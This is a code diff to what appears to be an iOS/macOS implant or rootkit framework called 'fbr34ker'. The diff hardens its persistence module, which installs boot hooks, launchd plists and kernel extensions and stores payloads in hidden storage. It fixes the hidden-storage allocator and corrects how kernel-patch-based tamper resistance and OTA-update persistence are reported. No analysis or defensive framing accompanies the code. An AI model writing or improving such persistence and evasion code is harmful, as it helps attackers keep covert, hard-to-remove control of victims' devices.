@@ -8,6 +8,19 @@
 #include "fbr34ker/apple_platform.h"
 
 static persistence_status_t state;
+static usize hidden_storage_used;
+
+static bool reserve_hidden_storage(usize size, usize *offset)
+{
+    if (offset == NULL || size == 0U ||
+        hidden_storage_used > state.hidden_storage_size ||
+        size > state.hidden_storage_size - hidden_storage_used) {
+        return false;
+    }
+    *offset = hidden_storage_used;
+    hidden_storage_used += size;
+    return true;
+}
 
 static void register_default_hooks(void)
 {
@@ -31,6 +44,7 @@ void persistence_init(void)
     state.ota_persistent = false;
     state.hidden_storage_base = 0U;
     state.hidden_storage_size = PERSISTENCE_HIDDEN_STORAGE_SIZE;
+    hidden_storage_used = 0U;
     register_default_hooks();
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
                             "persistence", 1U, 0U);
@@ -143,15 +157,13 @@ bool persistence_install_boot_hook(const char *hook_path, const u8 *payload,
                                     "persistence_boot_hook")) {
         return false;
     }
-    usize avail = PERSISTENCE_HIDDEN_STORAGE_SIZE - state.hidden_storage_base;
-    if (payload_size > avail) {
+    usize offset = 0U;
+    if (!reserve_hidden_storage(payload_size, &offset)) {
         log_write(LOG_LEVEL_WARN, "persistence: hidden storage full for boot hook '%s'",
                   hook_path);
         return false;
     }
-    u64 offset = state.hidden_storage_base;
     fm_memcpy(state.hidden_storage + offset, payload, payload_size);
-    state.hidden_storage_base += payload_size;
     for (u32 i = 0U; i < state.hook_count; ++i) {
         if (fm_strcmp(state.hooks[i].name, "boot-hook") == 0) {
             state.hooks[i].target_offset = offset;
@@ -179,15 +191,13 @@ bool persistence_install_launchd_plist(const char *label,
     usize label_len = fm_strlen(label) + 1U;
     usize path_len = fm_strlen(program_path) + 1U;
     usize total = label_len + path_len;
-    usize avail = PERSISTENCE_HIDDEN_STORAGE_SIZE - state.hidden_storage_base;
-    if (total > avail) {
+    usize offset = 0U;
+    if (!reserve_hidden_storage(total, &offset)) {
         log_write(LOG_LEVEL_WARN, "persistence: hidden storage full for launchd plist");
         return false;
     }
-    u64 offset = state.hidden_storage_base;
     fm_memcpy(state.hidden_storage + offset, label, label_len);
     fm_memcpy(state.hidden_storage + offset + label_len, program_path, path_len);
-    state.hidden_storage_base += total;
     for (u32 i = 0U; i < state.hook_count; ++i) {
         if (fm_strcmp(state.hooks[i].name, "launchd-plist") == 0) {
             state.hooks[i].target_offset = offset;
@@ -212,14 +222,12 @@ bool persistence_deploy_kernel_extension(const u8 *kext_data, usize kext_size)
                                     "persistence_kext")) {
         return false;
     }
-    usize avail = PERSISTENCE_HIDDEN_STORAGE_SIZE - state.hidden_storage_base;
-    if (kext_size > avail) {
+    usize offset = 0U;
+    if (!reserve_hidden_storage(kext_size, &offset)) {
         log_write(LOG_LEVEL_WARN, "persistence: hidden storage full for kext");
         return false;
     }
-    u64 offset = state.hidden_storage_base;
     fm_memcpy(state.hidden_storage + offset, kext_data, kext_size);
-    state.hidden_storage_base += kext_size;
     for (u32 i = 0U; i < state.hook_count; ++i) {
         if (fm_strcmp(state.hooks[i].name, "kext") == 0) {
             state.hooks[i].target_offset = offset;
@@ -242,6 +250,7 @@ bool persistence_allocate_hidden_storage(u64 base, u64 size)
     }
     state.hidden_storage_base = base;
     state.hidden_storage_size = size;
+    hidden_storage_used = 0U;
     fm_memset(state.hidden_storage, 0, size);
     log_write(LOG_LEVEL_INFO, "hidden storage allocated at 0x%llx (%llu bytes)",
               base, size);
@@ -261,15 +270,13 @@ bool persistence_store_payload(const char *name, const u8 *data, usize data_size
                                     "persistence_store")) {
         return false;
     }
-    usize avail = PERSISTENCE_HIDDEN_STORAGE_SIZE - state.hidden_storage_base;
-    if (data_size > avail) {
+    usize offset = 0U;
+    if (!reserve_hidden_storage(data_size, &offset)) {
         log_write(LOG_LEVEL_WARN, "persistence: hidden storage full for payload '%s'",
                   name);
         return false;
     }
-    u64 offset = state.hidden_storage_base;
     fm_memcpy(state.hidden_storage + offset, data, data_size);
-    state.hidden_storage_base += data_size;
     for (u32 i = 0U; i < state.hook_count; ++i) {
         if (fm_strcmp(state.hooks[i].name, "payload") == 0) {
             state.hooks[i].target_offset = offset;
@@ -328,7 +335,6 @@ bool persistence_apply_evasion(evasion_type_t type)
 
 bool persistence_enable_tamper_resistance(void)
 {
-    state.tamper_resistant = true;
     u64 addr = APPLE_IOS_KERNEL_BASE + 0x00C01000U;
     bool ok = kernel_patches_register(
         "tamper-resist", KERNEL_PATCH_TYPE_AUTHENTICATION,
@@ -336,6 +342,7 @@ bool persistence_enable_tamper_resistance(void)
     if (ok) {
         ok = kernel_patches_apply_by_type(KERNEL_PATCH_TYPE_AUTHENTICATION);
     }
+    state.tamper_resistant = ok;
     log_write(LOG_LEVEL_INFO, "tamper resistance %s",
               ok ? "enabled via kernel patch" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
@@ -345,7 +352,6 @@ bool persistence_enable_tamper_resistance(void)
 
 bool persistence_enable_ota_persistence(void)
 {
-    state.ota_persistent = true;
     u64 addr = APPLE_IOS_KERNEL_BASE + 0x00C01100U;
     bool ok = kernel_patches_register(
         "ota-persist", KERNEL_PATCH_TYPE_MEMORY,
@@ -353,6 +359,7 @@ bool persistence_enable_ota_persistence(void)
     if (ok) {
         ok = kernel_patches_apply_by_type(KERNEL_PATCH_TYPE_MEMORY);
     }
+    state.ota_persistent = ok;
     log_write(LOG_LEVEL_INFO, "OTA update persistence %s",
               ok ? "enabled via kernel patch" : "pending");
     (void)event_bus_publish(FBR34KER_EVENT_COMPONENT_STATE,
